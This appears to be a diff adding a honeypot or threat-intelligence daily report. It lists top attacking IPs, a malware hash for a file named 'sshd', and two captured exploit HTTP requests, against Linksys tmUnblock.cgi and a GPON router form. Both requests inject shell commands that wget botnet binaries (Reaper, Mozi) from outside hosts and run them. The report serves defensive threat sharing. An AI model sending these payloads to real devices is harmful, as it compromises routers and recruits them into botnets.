@@ -1,0 +1,40 @@
+Top 5 IPs for 03-07-2024 :
+
+152.52.15.210
+152.228.131.33
+27.71.224.4
+125.124.98.200
+91.196.164.176
+
+Malware Observed:
+
+
+File name : sshd
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+
+
+
+Commands/exploits observed:
+
+POST /tmUnblock.cgi HTTP/1.1
+Host: 213.202.208.9:80
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: /
+User-Agent: python-requests/2.20.0
+Content-Length: 227
+Content-Type: application/x-www-form-urlencoded
+
+ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+mpsl%3B+wget+http%3A%2F%2F213.202.208.9%2Freaper%2Freap.mpsl%3B+chmod+777+reap.mpsl%3B+.%2Freap.mpsl+Reaper.linksys%60&action=&ttcp_num=2&ttcp_size=2&submit_button=&change_action=&commit=0&StartEPI=1
+
+
+POST /GponForm/diag_Form?images/ HTTP/1.1
+Host: 127.0.0.1:80
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Hello, World
+Content-Length: 118
+
+XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://59.92.167.68:55391/Mozi.m+-O+->/tmp/gpon80;sh+/tmp/gpon80&ipv=0
